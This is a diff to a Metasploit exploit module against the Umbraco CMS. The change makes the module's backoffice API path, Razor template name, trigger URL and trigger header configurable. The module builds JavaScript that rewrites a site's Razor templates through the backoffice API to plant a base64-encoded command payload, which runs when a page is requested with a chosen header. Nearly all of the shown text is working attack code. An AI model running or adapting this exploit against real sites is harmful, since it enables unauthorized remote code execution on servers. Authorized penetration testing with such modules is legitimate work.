@@ -39,6 +39,17 @@ class MetasploitModule < Msf::Exploit::Remote
         ],
       )
     )
+
+    register_options([
+      OptString.new('BACKOFFICE_API',
+        [ true, 'The path to the Umbraco backoffice API', '/umbraco/backoffice/UmbracoApi' ]),
+      OptString.new('RAZOR_TEMPLATE',
+        [ true, 'The name of the Razor template to use for code execution', 'Home' ]),
+      OptString.new('TRIGGER_URL',
+        [ true, 'The URL of the page to request to trigger the command', '/' ]),
+      OptString.new('TRIGGER_HEADER',
+        [ true, 'The name of the HTTP header to trigger the command', 'Authorization' ])
+    ])
   end
 
   #
@@ -65,12 +76,13 @@ class MetasploitModule < Msf::Exploit::Remote
     cmdBase64 = Base64.strict_encode64(payload.encoded)
 
     %Q~
+
     // Payload configuration
     const cmdBase64 = "#{cmdBase64}";
-    const umbracoAPI = "/umbraco/backoffice/UmbracoApi";
-    const razorTemplateName = "Home";
-    const triggerURL = "/";
-    const triggerHeaderName = "Authorization";
+    const umbracoAPI = "#{datastore['BACKOFFICE_API']}";
+    const razorTemplateName = "#{datastore['RAZOR_TEMPLATE']}";
+    const triggerURL = "#{datastore['TRIGGER_URL']}";
+    const triggerHeaderName = "#{datastore['TRIGGER_HEADER']}";
     
     // Get all templates
     getJSON(umbracoAPI + "/Template/GetAll").then(function (allTemplates) {
@@ -178,7 +190,7 @@ class MetasploitModule < Msf::Exploit::Remote
         "}"
       );
     }
-        
+
     ~
   end
 end
